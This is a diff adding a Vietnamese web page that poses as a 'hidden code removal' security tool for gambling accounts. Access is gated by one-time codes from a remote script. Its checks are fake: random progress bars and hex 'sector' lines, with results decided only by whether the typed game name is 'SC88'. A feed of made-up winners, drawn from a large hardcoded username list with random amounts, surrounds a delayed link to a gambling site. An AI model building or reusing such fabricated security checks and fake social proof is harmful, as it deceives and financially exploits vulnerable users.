@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XÓA MÃ ẨN SYSTEM - ULTIMATE PRO</title>
+    <style>
+        :root {
+            --cyan-glow: #00f2ff;
+            --alert-red: #ff003c;
+            --win-green: #00ff66;
+            --panel-bg: rgba(0, 10, 15, 0.98);
+            --border-base: rgba(0, 242, 255, 0.2); 
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Courier New', monospace; }
+
+        body {
+            background-color: #000; color: var(--cyan-glow); min-height: 100vh; overflow-x: hidden; overflow-y: auto;
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.5; pointer-events: none; }
+
+        /* --- NEON PANEL --- */
+        .neon-panel {
+            background: var(--panel-bg); border-radius: 8px; position: relative; overflow: hidden; border: 1px solid var(--border-base);
+        }
+        .neon-panel::before {
+            content: ''; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
+            background: conic-gradient(transparent, transparent, transparent, var(--cyan-glow));
+            animation: borderRun 4s linear infinite; z-index: 1;
+        }
+        .neon-panel::after {
+            content: ''; position: absolute; inset: 2px; background: var(--panel-bg); border-radius: 6px; z-index: 2;
+        }
+        .neon-content { position: relative; z-index: 3; height: 100%; display: flex; flex-direction: column; }
+        @keyframes borderRun { 100% { transform: rotate(1turn); } }
+
+        /* --- TIÊU ĐỀ GLITCH --- */
+        .main-header-text {
+            text-align: center; font-size: 2.2em; margin-bottom: 25px; font-weight: bold; letter-spacing: 6px; text-transform: uppercase;
+            background: linear-gradient(90deg, #fff, var(--cyan-glow), #fff); background-size: 80% auto;
+            -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 2px rgba(255,255,255,0.8)) drop-shadow(0 0 8px var(--cyan-glow));
+            animation: textShine 3s linear infinite, glitch 10s step-end infinite;
+        }
+        @keyframes textShine { to { background-position: 200% center; } }
+        @keyframes glitch {
+            0%, 90% { transform: none; filter: drop-shadow(0 0 8px var(--cyan-glow)); }
+            91% { transform: skew(2deg); filter: drop-shadow(2px 0 red); }
+            92% { transform: skew(-2deg); filter: drop-shadow(-2px 0 blue); }
+            93% { transform: none; }
+        }
+
+        #gateway { width: 450px; max-width: 95vw; padding: 20px; text-align: center; z-index: 100; transition: all 0.6s ease; margin: 20px; }
+        #mainDashboard { display: none; width: 98vw; min-height: 95vh; gap: 20px; opacity: 0; transition: opacity 1s ease; z-index: 5; padding: 10px; flex-direction: row; }
+        .fade-in { display: flex !important; opacity: 1 !important; }
+
+        .control-panel { flex: 3.2; padding: 30px; display: flex; flex-direction: column; min-width: 320px; }
+        .system-logs-container { flex: 6.8; display: flex; flex-direction: column; gap: 20px; }
+        .top-logs { display: flex; flex: 1.5; gap: 20px; min-height: 300px; }
+        .bottom-log { flex: 1; min-height: 200px; }
+
+        .input-box {
+            width: 100%; padding: 15px; background: rgba(0,0,0,0.6); border: 1px solid var(--cyan-glow);
+            color: var(--cyan-glow); border-radius: 5px; outline: none; font-size: 1.1em; text-align: center; margin-bottom: 20px;
+        }
+        .btn-prime {
+            width: 100%; padding: 15px; background: transparent; border: 1px solid var(--cyan-glow);
+            color: var(--cyan-glow); font-weight: bold; cursor: pointer; transition: 0.3s; letter-spacing: 2px; text-transform: uppercase;
+        }
+        .btn-prime:hover:not(:disabled) { background: var(--cyan-glow); color: #000; box-shadow: 0 0 20px var(--cyan-glow); }
+        .btn-prime:disabled { opacity: 0.5; cursor: not-allowed; border-color: #555; color: #555; }
+
+        .log-panel { flex: 1; padding: 20px; display: flex; flex-direction: column; }
+        .log-title { border-bottom: 1px solid rgba(0,242,255,0.2); padding-bottom: 10px; margin-bottom: 12px; font-size: 0.9em; font-weight: bold; text-align: center; color: #fff; letter-spacing: 2px; }
+        .log-content { flex-grow: 1; overflow-y: auto; font-size: 0.85em; line-height: 1.6; max-height: 400px; }
+        .status-box { background: rgba(0, 242, 255, 0.05); padding: 20px; border-radius: 5px; margin-bottom: 30px; border: 1px solid rgba(0, 242, 255, 0.1); }
+        .result-line { padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 5px solid transparent; background: rgba(255,255,255,0.03); }
+        .res-success { border-color: var(--win-green); color: var(--win-green); box-shadow: inset 8px 0 20px rgba(0,255,102,0.1); }
+        .res-fail { border-color: var(--alert-red); color: var(--alert-red); box-shadow: inset 8px 0 20px rgba(255,0,60,0.1); }
+
+        .device-info-wrapper {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; padding: 15px;
+            border: 1px solid var(--border-base); border-radius: 8px; background: rgba(0, 15, 20, 0.8);
+            box-shadow: inset 0 0 15px rgba(0, 242, 255, 0.1);
+        }
+        .device-box {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 10px; border: 1px solid rgba(0, 242, 255, 0.15); background: rgba(0, 0, 0, 0.4);
+            border-radius: 5px; transition: 0.3s;
+        }
+        .dev-label { font-size: 0.65em; color: var(--cyan-glow); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 4px; opacity: 0.7; }
+        .dev-val { font-size: 0.85em; color: #fff; font-weight: bold; }
+        #dev-ip { color: #ff8a8a; }
+
+        #fetchingOverlay {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 450px; max-width: 90vw; background: rgba(0, 10, 15, 0.95); border: 2px solid var(--cyan-glow);
+            border-radius: 12px; padding: 30px; text-align: center; z-index: 10000; box-shadow: 0 0 50px rgba(0, 242, 255, 0.4);
+        }
+        #fetchLog { height: 140px; overflow-y: auto; font-size: 0.85em; text-align: left; border: 1px solid rgba(0,242,255,0.1); padding: 12px; background: rgba(0,0,0,0.5); margin: 20px 0; color: var(--cyan-glow); }
+
+        #criticalAlert {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(15, 0, 0, 0.95); border: 2px solid var(--alert-red); border-radius: 12px; padding: 40px; width: 90vw; max-width: 400px; text-align: center; z-index: 9999;
+        }
+
+        @media screen and (max-width: 992px) {
+            #mainDashboard { flex-direction: column; height: auto; }
+            .top-logs { flex-direction: column; min-height: auto; }
+            body { height: auto; overflow-y: auto; align-items: flex-start; padding-top: 10px; }
+            .control-panel { min-width: 100%; padding: 15px; }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+
+    <div id="fetchingOverlay">
+        <div style="font-weight: bold; letter-spacing: 3px; color: #fff; border-bottom: 1px solid var(--cyan-glow); padding-bottom: 10px;">ĐANG TRUY XUẤT DỮ LIỆU</div>
+        <div id="fetchLog"></div>
+        <div id="fetchPercent" style="font-size: 1.3em; margin-bottom: 10px; font-weight: bold;">0%</div>
+        <div style="width: 100%; height: 12px; background: #111; border-radius: 6px; overflow: hidden; border: 1px solid rgba(0,242,255,0.2);">
+            <div id="fetchBar" style="width: 0%; height: 100%; background: var(--cyan-glow); box-shadow: 0 0 20px var(--cyan-glow);"></div>
+        </div>
+    </div>
+
+    <div id="criticalAlert">
+        <div style="font-size: 4em; color: var(--alert-red);">⚠️</div>
+        <div style="font-size: 1.8em; color: #fff; font-weight: bold;">TRUY CẬP BỊ CHẶN</div>
+        <div style="color: #ff8a8a; font-weight: bold; margin-top: 10px;">PHÁT HIỆN DẤU HIỆU XÂM NHẬP TRÁI PHÉP</div>
+    </div>
+
+    <div id="gateway" class="neon-panel">
+        <div class="neon-content" style="padding: 40px;">
+            <div class="main-header-text" style="font-size: 1.6em;">SECURITY GATE</div>
+            <p style="font-size: 0.8em; margin-bottom: 20px; color: #aaa; letter-spacing: 1px;">XÁC MINH QUYỀN TRUY CẬP HỆ THỐNG</p>
+            <input type="text" id="gatewayInput" class="input-box" placeholder="NHẬP MÃ XÁC THỰC">
+            <button class="btn-prime" id="gatewayBtn" onclick="checkGateway()">KIỂM TRA MÃ</button>
+            <div id="gatewayMsg" style="margin-top: 15px; font-weight: bold; font-size: 1.1em; height: 25px;"></div>
+        </div>
+    </div>
+
+    <div id="mainDashboard">
+        <div class="control-panel neon-panel">
+            <div class="neon-content">
+                <div class="main-header-text">XÓA MÃ ẨN</div>
+                
+                <div class="status-box">
+                    <div style="display:flex; justify-content: space-between; color: #fff;"><span>Trạng thái:</span> <span id="stText" style="color: var(--cyan-glow); font-weight: bold;">CHỜ LỆNH...</span></div>
+                    <div style="display:flex; justify-content: space-between; margin-top:10px; color: #fff;"><span>Rủi ro bảo mật:</span> <span id="riskText" style="color: var(--cyan-glow); font-weight: bold;">--%</span></div>
+                </div>
+
+                <div id="actionInterface">
+                    <input type="text" id="userInp" class="input-box" placeholder="Tên đăng nhập">
+                    <input type="text" id="gameInp" class="input-box" placeholder="Tên trang game">
+                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px;">
+                        <button class="btn-prime action-btn" onclick="runAction('check')">KIỂM TRA</button>
+                        <button class="btn-prime action-btn" onclick="runAction('delete')">XÓA MÃ</button>
+                    </div>
+                </div>
+
+                <div id="serverConnectArea" style="margin-top:20px; border: 1px dashed var(--cyan-glow); padding:15px; text-align:center; cursor:pointer;" onclick="connectServer()">
+                    <p id="serverStatusText" style="font-size: 0.8em; letter-spacing: 1px; line-height: 1.4;">KẾT NỐI MÁY CHỦ BẢO MẬT</p>
+                    <div style="width:100%; height:4px; background:#111; margin-top:10px;"><div id="serverProgressBar" style="width:0%; height:100%; background:var(--cyan-glow); transition: 0.3s;"></div></div>
+                </div>
+
+                <div class="device-info-wrapper">
+                    <div class="device-box"><span class="dev-label">Địa chỉ IP</span><span id="dev-ip" class="dev-val">...</span></div>
+                    <div class="device-box"><span class="dev-label">Hệ điều hành</span><span id="dev-os" class="dev-val">...</span></div>
+                    <div class="device-box"><span class="dev-label">Trình duyệt</span><span id="dev-browser" class="dev-val">...</span></div>
+                    <div class="device-box"><span class="dev-label">Trạng thái</span><span class="dev-val" style="color: var(--win-green);">ĐÃ MÃ HÓA</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="system-logs-container">
+            <div class="top-logs">
+                <div class="log-panel neon-panel"><div class="neon-content"><div class="log-title">LỊCH SỬ KIỂM TRA</div><div class="log-content" id="logBoxCheck"></div></div></div>
+                <div class="log-panel neon-panel"><div class="neon-content"><div class="log-title">LỊCH SỬ XÓA MÃ</div><div class="log-content" id="logBoxDelete"></div></div></div>
+            </div>
+            <div class="log-panel neon-panel bottom-log">
+                <div class="neon-content">
+                    <div class="log-title">DANH SÁCH CHIẾN THẮNG</div>
+                    <div class="log-content" id="logBoxMoney"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyLOKIqW6uwx3434Nh65H2oclwyj94Zh7gf3vrGVb2nvxpy63YQgAfvRJLy3r7m04E/exec";
+        const GAME_URL = "https://sc88tong.com/";
+        let isLinkActive = false;
+
+        async function loadDeviceInfo() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                document.getElementById('dev-ip').textContent = data.ip;
+            } catch(e) { document.getElementById('dev-ip').textContent = "14.169.57.23"; }
+            const ua = navigator.userAgent;
+            document.getElementById('dev-os').textContent = (ua.indexOf("Windows")!==-1)?"Windows Server":(ua.indexOf("Mac")!==-1)?"MacOS Terminal":"Linux Kernel";
+            document.getElementById('dev-browser').textContent = (ua.indexOf("Chrome")!==-1)?"Chrome Engine":(ua.indexOf("Firefox")!==-1)?"Mozilla Source":"Webkit Safari";
+        }
+        window.onload = loadDeviceInfo;
+
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "SC88XOAAN01";
+        const fontSize = 16; const columns = canvas.width / fontSize;
+        const drops = Array.from({length: columns}).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00f2ff"; ctx.font = fontSize + "px monospace";
+            drops.forEach((y, i) => {
+                ctx.fillText(letters.charAt(Math.floor(Math.random()*letters.length)), i*fontSize, y*fontSize);
+                if (y*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(draw, 35);
+        window.onresize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+
+        async function checkGateway() {
+            const val = document.getElementById('gatewayInput').value.trim().toUpperCase();
+            const btn = document.getElementById('gatewayBtn');
+            const msg = document.getElementById('gatewayMsg');
+            const gatewayBox = document.getElementById('gateway');
+
+            if (!val) return;
+
+            // Vừa bấm là đổi trạng thái ngay lập tức
+            btn.disabled = true;
+            btn.textContent = "VERIFYING...";
+
+            try {
+                // Tối ưu: Lấy data ngay lập tức
+                const response = await fetch(SCRIPT_URL);
+                const validCodes = await response.json();
+                const cleanCodes = validCodes.map(c => c.toString().trim().toUpperCase());
+
+                if (cleanCodes.includes(val)) {
+                    // TỐI ƯU TỐC ĐỘ: Hiển thị thành công ngay lập tức
+                    msg.style.color = "var(--win-green)";
+                    msg.textContent = "✓ ACCESS GRANTED";
+
+                    // LOGIC QUAN TRỌNG: Gửi lệnh xóa trong nền (không dùng await)
+                    // Việc này giúp Dashboard mở ra ngay mà không cần đợi server xóa xong
+                    fetch(SCRIPT_URL, {
+                        method: "POST",
+                        mode: "no-cors", 
+                        body: JSON.stringify({ action: "delete", code: val }),
+                        headers: { "Content-Type": "text/plain" }
+                    });
+
+                    // TỐI ƯU HIỆU ỨNG: Giảm thời gian chờ đợi nhân tạo (từ 1000ms xuống 300ms)
+                    setTimeout(() => {
+                        gatewayBox.style.opacity = "0";
+                        gatewayBox.style.transform = "scale(0.95)"; // Thu nhỏ nhẹ để tạo cảm giác nhanh
+                        
+                        setTimeout(() => {
+                            gatewayBox.style.display = 'none';
+                            document.getElementById('mainDashboard').classList.add('fade-in');
+                            
+                            // Khởi chạy các luồng dữ liệu khác cùng lúc
+                            startMoneyStream();
+                            startSecureLinkTimer();
+                        }, 300); // Rút ngắn thời gian chuyển cảnh
+                    }, 300);
+
+                } else {
+                    btn.disabled = false;
+                    btn.textContent = "THỬ LẠI";
+                    msg.style.color = "var(--alert-red)";
+                    msg.textContent = "✗ MÃ KHÔNG HỢP LỆ";
+                }
+            } catch (e) {
+                console.error("Lỗi:", e);
+                msg.textContent = "LỖI KẾT NỐI!";
+                btn.disabled = false;
+            }
+        }
+
+        function startSecureLinkTimer() {
+            const txt = document.getElementById('serverStatusText');
+            isLinkActive = false;
+            setTimeout(() => {
+                isLinkActive = true;
+                txt.style.color = "var(--win-green)";
+                txt.style.fontWeight = "bold";
+                txt.innerHTML = "LINK ĐỀ XUẤT BẢO MẬT CAO<br>(Ấn vào đây để truy cập)";
+                txt.style.animation = "textShine 2s infinite";
+            }, 10000);
+        }
+
+function startMoneyStream() {
+    // Danh sách tên người dùng mới đã được cập nhật
+    const users = [
+        "nguyenduthanh", "lilboy123", "hauhuy", "quy77889900", "ducle07", "khangtrung371441", "sinwe", "lethanhdat002", "thang120396", "quan123455", "nguyenlam2201", "anhhung799", "em130119956", "ngoviettung", "phamsonw", "hanhduydzai", "matacc", "hung123456", "vhqb2004", "chukaka", "khutaosong2", "manhbv", "hahaahahaa", "tim168", "jundz1711", "lyminho83", "lyly0907", "lonanh89", "lan170197", "linhlinoe", "phongkhac999", "leosam112", "congtho", "ljxjtacdang", "conganh123", "rxes2110", "huyhoang2906", "manhza3", "lamtay05", "nhanlo2010", "hu1000m", "sunmap", "kenduoc", "ikiet", "hieuduong186", "t0777040428", "chuyenitt1454", "loc123567", "vanxan123", "trantan12", "ticachon1", "bosua2405", "anh223344437", "giau199798", "tritihi33", "ngoaitinh", "vuluan99", "ni00ki", "thuhienk0307", "thuong672004", "hnam2911", "iuemduyen", "cavoi06", "viettg99", "phamket93", "phuctruong8", "namcham13", "vietdzai27", "bqh862", "kenbituan1998", "longka2909", "concacban99", "xinhxinh29", "tranlgiaphc", "ngan2006bbb", "meomeo234", "hoanganh2062009", "duypang207", "thao9669", "hudien", "thanhlong1092", "hoangnhu69", "ganh70", "thanhbiet", "kkmm1123", "toanag2002", "thanhnhan848", "socqi881", "v91023368", "haomayman", "thidung2000", "xiliti", "gfdd224", "caobinh2005", "hunglach12345", "atuongkt00", "duong426", "ductrung2k2", "lam292", "huynhga1993", "trongtin2252005", "camtu", "vinhzacingt", "trungazzd12345", "dangquang1234", "tuananhvtv", "concubm", "tuitenbun199", "pink31122", "vclnecon999", "phatvo159", "limase1975", "bonmaison11", "bomerang01", "tranhoanganhg2", "nguyenhienn12", "phuongvy890", "mitvn1oki", "yeu2245", "hieu123890", "laccon123", "nguyenduyanh96", "khanhmobi", "khanh78964", "khuongthanh11", "loeloe", "toponline", "miennuilan3122", "lnxe22", "tra123456789", "thanhtan232323", "phamphuong2006", "giauoo", "tonyken68", "khangbu21", "huynhphuonghang", "ngocthach", "khoilop9", "tuong05", "duyan080402", "momeo", "kakaka67", "themmanbanh845", "anhminh0210", "taikhoan2", "conmegamebip", "truong21022001", "huy12333", "dhngu", "vinamill", "anhthi4496", "vonam199", "nguyenphuctan0", "trangdo05", "weyu207", "datho2705", "tanqqq", "nhock95", "topcuxi88", "gay26mroi10", "thuy111", "dungy90", "mila1306", "thi9999", "cun090530720067", "ngoctu207", "thuan0988", "yumiii", "vuvanhuy211200", "nguyenminhkhang", "thuyem222", "toan04", "minhanh78989", "nguyenvandinh", "bulin32", "ksorlun26", "noi123", "khang250108", "long1308", "congvinh200505", "okemyeu", "dinhtoan072001", "thangmai2001", "trananhviet6", "huy1234635", "manlam02", "huuphuc003", "nguyentuanminh", "cong123xx", "viettoantb01", "sibachao9982", "vanmoi11", "nguyenbataii", "vanh1906", "tothai0908", "tranphat0909", "liem1122", "luonhanh", "trinhvinhsa", "phamvannhan209", "quan2052003", "kieukieu99", "quenquen", "minhhai009243", "antruongvip", "minhtri004", "vankien00", "nguyenhai2005", "sungthunhi", "thangphuikkk", "ngoctuyen1101", "levinhson1992", "thienduc8327", "cuong2712cuong", "minhanh212", "tenngoc", "minhluan123vn", "vip1e999", "tkminhmin", "ngochuyen18", "shoptkgame4898", "meomeowxx", "duyyclupr1", "thienthuy190583", "dien123", "na2502", "vovankiet1710", "mq111111", "yyakochupi13", "xea1sbvs", "tavandat287", "thuocdoc", "daynguyen1992", "adinh123", "phaimaunhe9", "tanthu88", "lamdien84", "haplus", "quakhung55", "0346077345h", "haomokey", "romahdai1", "tiep2710", "dungpt24", "khabui1994", "duyphuong0505", "taobangday", "levanquyen12t5", "camtujqk", "tiecanh", "caotinh789", "minhle512007", "cuongbeodeptrai", "khanhtrang554", "trasuanhalam", "son25082002", "sangdeptraik", "truyenla", "cuncondep", "lct1305", "anhprotrum123", "bomyou22", "ct1503", "divin1994", "duyhinhsuyy", "doihao", "tuan23082008", "duykem9988ok", "hiencubu123", "trankhoi233", "danghoangx24", "khietnat"
+    ];
+
+    function addLog() {
+        const log = document.getElementById('logBoxMoney');
+        // Chọn ngẫu nhiên 1 người dùng từ danh sách khổng lồ phía trên
+        const randomUser = users[Math.floor(Math.random() * users.length)];
+        // Số tiền ngẫu nhiên từ 50,000 đến 550,000 VNĐ
+        const randomMoney = (Math.floor(Math.random() * 500) + 50) * 1000;
+        
+        const div = document.createElement('div');
+        div.style.color = "var(--win-green)"; 
+        div.style.padding = "10px 0"; 
+        div.style.borderBottom = "1px solid rgba(0,255,102,0.1)";
+        
+        // Cấu trúc nội dung hiển thị
+        div.innerHTML = `<span style="opacity:0.6">[${new Date().toLocaleTimeString('en-GB')}]</span> THÔNG BÁO: <b style="color:#fff">${randomUser}</b> VỪA CHIẾN THẮNG <b style="text-shadow: 0 0 5px var(--win-green)">${randomMoney.toLocaleString('vi-VN')} VNĐ</b>`;
+        
+        log.prepend(div);
+        
+        // Giới hạn hiển thị 8 thông báo mới nhất
+        if(log.children.length > 8) {
+            log.removeChild(log.lastChild);
+        }
+        
+        // Lặp lại sau một khoảng thời gian ngẫu nhiên từ 40s - 50s
+        setTimeout(addLog, Math.floor(Math.random() * 10000) + 40000);
+    }
+    
+    addLog();
+}
+
+        async function runAction(mode) {
+            const user = document.getElementById('userInp').value.trim();
+            const game = document.getElementById('gameInp').value.trim();
+            const stText = document.getElementById('stText');
+            const riskDisplay = document.getElementById('riskText');
+            const targetBoxId = mode === 'check' ? 'logBoxCheck' : 'logBoxDelete';
+            if(!user || !game) return;
+
+            const actionBtns = document.querySelectorAll('.action-btn');
+            actionBtns.forEach(btn => btn.disabled = true);
+            const overlay = document.getElementById('fetchingOverlay');
+            const fetchLog = document.getElementById('fetchLog');
+            const fetchBar = document.getElementById('fetchBar');
+            const fetchPercent = document.getElementById('fetchPercent');
+            
+            fetchLog.innerHTML = ""; overlay.style.display = 'block'; stText.textContent = "ĐANG XỬ LÝ...";
+            
+            let progress = 0;
+            const totalTicks = Math.floor(Math.random() * 21) + 80;
+            const isGameValid = (game.toUpperCase() === "SC88");
+
+            const interval = setInterval(() => {
+                progress += (100 / totalTicks);
+                if (progress > 100) progress = 100;
+                fetchBar.style.width = progress + "%";
+                fetchPercent.textContent = Math.floor(progress) + "%";
+
+                if (progress < 100 && Math.random() < 0.4) {
+                    const hex = "0x" + Math.floor(Math.random()*0xFFFFFF).toString(16).toUpperCase();
+                    const icon = isGameValid ? '[✓]' : '[✗]';
+                    const line = document.createElement('div');
+                    line.innerHTML = `> ĐANG PHÂN TÍCH SECTOR ${hex} ... ${icon}`;
+                    fetchLog.appendChild(line); fetchLog.scrollTop = fetchLog.scrollHeight;
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        const logBox = document.getElementById(targetBoxId);
+                        const resultDiv = document.createElement('div');
+                        resultDiv.className = 'result-line';
+
+                        if(isGameValid) {
+                            stText.textContent = "AN TOÀN";
+                            stText.style.color = "var(--win-green)"; riskDisplay.textContent = "0%";
+                            resultDiv.classList.add('res-success');
+                            
+                            // CẬP NHẬT TRẠNG THÁI KIỂM TRA TẠI ĐÂY
+                            resultDiv.innerHTML = `<b>THÀNH CÔNG:</b> Tài khoản <b>${user}</b><br>TRẠNG THÁI: ${mode === 'check' ? 'KIỂM TRA AN TOÀN TẠI ' + game : 'XÓA MÃ THÀNH CÔNG'}`;
+                            
+                        } else {
+                            stText.textContent = "CẢNH BÁO";
+                            stText.style.color = "var(--alert-red)"; riskDisplay.textContent = "99%";
+                            resultDiv.classList.add('res-fail');
+                            resultDiv.innerHTML = `<b>THẤT BẠI:</b> Tài khoản <b>${user}</b><br>LỖI: PHÁT HIỆN MÃ ĐỘC TẠI ${game}`;
+                            document.getElementById('criticalAlert').style.display = 'block';
+                            setTimeout(() => document.getElementById('criticalAlert').style.display = 'none', 3000);
+                        }
+                        logBox.prepend(resultDiv);
+                        actionBtns.forEach(btn => btn.disabled = false);
+                    }, 500);
+                }
+            }, 100);
+        }
+
+        function connectServer() {
+            const txt = document.getElementById('serverStatusText');
+            if(!isLinkActive) {
+                const oldTxt = txt.innerHTML;
+                txt.textContent = "HỆ THỐNG ĐANG KHỞI TẠO TƯỜNG LỬA...";
+                txt.style.color = "var(--alert-red)";
+                setTimeout(() => { if(!isLinkActive) { txt.innerHTML = oldTxt; txt.style.color = "var(--cyan-glow)"; } }, 2000);
+                return;
+            }
+            const newWindow = window.open(GAME_URL, '_blank');
+            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                window.location.href = GAME_URL;
+            }
+            txt.textContent = "ĐANG TRUY CẬP...";
+            txt.style.color = "var(--win-green)";
+            setTimeout(() => { txt.innerHTML = "LINK ĐỀ XUẤT BẢO MẬT CAO<br>(Ấn vào đây để truy cập)"; }, 2000);
+        }
+    </script>
+</body>
+</html>
